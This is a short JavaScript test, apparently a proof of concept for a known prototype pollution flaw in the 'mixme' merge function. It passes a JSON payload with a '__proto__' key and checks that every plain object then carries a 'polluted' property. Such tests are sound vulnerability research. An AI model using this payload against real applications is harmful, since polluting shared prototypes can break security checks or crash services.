//https://snyk.io/vuln/SNYK-JS-MIXME-1278998
test("prototype pollution in safe-object2", () => {
  const { merge } = require("mixme");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
  expect({}.polluted).toBe("yes");
});
